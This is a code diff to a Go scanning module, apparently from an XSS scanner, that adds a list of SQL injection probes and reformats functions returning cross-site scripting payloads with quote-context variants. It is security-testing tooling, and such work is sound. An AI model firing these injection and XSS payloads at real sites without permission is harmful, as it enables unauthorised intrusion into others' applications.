@@ -2,6 +2,58 @@ package scanning
 
 import "strings"
 
+//basic sql injection payloads
+func getSQLIPayload() []string {
+	payload := []string{
+		"'",
+		"''",
+		"`",
+		"``",
+		",",
+		"\"",
+		"\"\"",
+		"/",
+		"//",
+		";",
+		"' or ",
+		"-- or #",
+		"' OR '1",
+		"' OR 1 -- -",
+		" OR \"\" = \"",
+		"\" OR 1 = 1 -- -",
+		"' OR '' = '",
+		"'='",
+		"'LIKE'",
+		"'=0--+",
+		"%00",
+		"/*…*/",
+		" AND 1",
+		" AND 0",
+		" AND true",
+		" AND false",
+		" OR 1=1",
+		" OR 1=0",
+		" OR 1=1#",
+		" OR 1=0#",
+		" OR 1=1--",
+		" OR 1=0--",
+		" HAVING 1=1",
+		" HAVING 1=0",
+		" HAVING 1=1#",
+		" HAVING 1=0#",
+		" HAVING 1=1--",
+		" HAVING 1=0--",
+		" AND 1=1",
+		" AND 1=0",
+		" AND 1=1--",
+		" AND 1=0--",
+		" AND 1=1#",
+		" AND 1=0#",
+		" ORDER BY 1",
+	}
+	return payload
+}
+
 //getSSTIPayload is return SSTI Payloads
 func getSSTIPayload() []string {
 	payload := []string{
@@ -74,7 +126,7 @@ func getCommonPayload() []string {
 }
 
 func getHTMLPayload(ip string) []string {
-	payload := []string {
+	payload := []string{
 		"<sVg/onload=prompt(45) class=dalfox>",
 		"<Svg/onload=alert(45) class=dalfox>",
 		"<svG/onload=confirm(45) class=dalfox>",
@@ -100,7 +152,7 @@ func getHTMLPayload(ip string) []string {
 		"<iFrAme/src=jaVascRipt:alert(45)></iFramE>",
 		"<xmp><p title=\"</xmp><svg/onload=alert(45)>",
 	}
-	if strings.Contains(ip,"comment") {
+	if strings.Contains(ip, "comment") {
 		// TODO add comment payloads
 	}
 	return payload
@@ -108,7 +160,7 @@ func getHTMLPayload(ip string) []string {
 
 // getAttrPayload is is return xss
 func getAttrPayload(ip string) []string {
-	payload := []string {
+	payload := []string{
 		"onmouseleave=confirm(45) class=dalfox",
 		"><SvG/onload=alert(45) class=dalfox>",
 		"</ScriPt><sCripT class=dalfox>alert(45)</sCriPt>",
@@ -122,15 +174,15 @@ func getAttrPayload(ip string) []string {
 	}
 	if strings.Contains(ip, "double") {
 		var tempPayload []string
-		for _,v := range payload {
-			tempPayload = append(tempPayload,"\""+v)
+		for _, v := range payload {
+			tempPayload = append(tempPayload, "\""+v)
 		}
 		return tempPayload
 	}
 	if strings.Contains(ip, "single") {
 		var tempPayload []string
-		for _,v := range payload {
-			tempPayload = append(tempPayload,"'"+v)
+		for _, v := range payload {
+			tempPayload = append(tempPayload, "'"+v)
 		}
 		return tempPayload
 	}
@@ -138,7 +190,7 @@ func getAttrPayload(ip string) []string {
 }
 
 func getInJsPayload(ip string) []string {
-	payload := []string {
+	payload := []string{
 		"alert(45)",
 		"confirm(45)",
 		"prompt(45)",
@@ -156,38 +208,37 @@ func getInJsPayload(ip string) []string {
 	}
 	if strings.Contains(ip, "none") {
 		var tempPayload []string
-		for _,v := range payload {
-			tempPayload = append(tempPayload,";"+v+";//")
+		for _, v := range payload {
+			tempPayload = append(tempPayload, ";"+v+";//")
 		}
 		return tempPayload
 	}
 	if strings.Contains(ip, "double") {
 		var tempPayload []string
-		for _,v := range payload {
-			tempPayload = append(tempPayload,"\"+"+v+"+\"")
-			tempPayload = append(tempPayload,"\"-"+v+"+\"")
+		for _, v := range payload {
+			tempPayload = append(tempPayload, "\"+"+v+"+\"")
+			tempPayload = append(tempPayload, "\"-"+v+"+\"")
 		}
 		return tempPayload
 	}
 	if strings.Contains(ip, "single") {
 		var tempPayload []string
-		for _,v := range payload {
-			tempPayload = append(tempPayload,"'+"+v+"+'")
-			tempPayload = append(tempPayload,"'-"+v+"+'")
+		for _, v := range payload {
+			tempPayload = append(tempPayload, "'+"+v+"+'")
+			tempPayload = append(tempPayload, "'-"+v+"+'")
 		}
 		return tempPayload
 	}
 	if strings.Contains(ip, "backtick") {
 		var tempPayload []string
-		for _,v := range payload {
-			tempPayload = append(tempPayload,"${"+v+"}")
+		for _, v := range payload {
+			tempPayload = append(tempPayload, "${"+v+"}")
 		}
 		return tempPayload
 	}
 	return payload
-	
-}
 
+}
 
 // makeDynamicPayload is return xss
 func makeDynamicPayload(badchars, rtype string) []string {
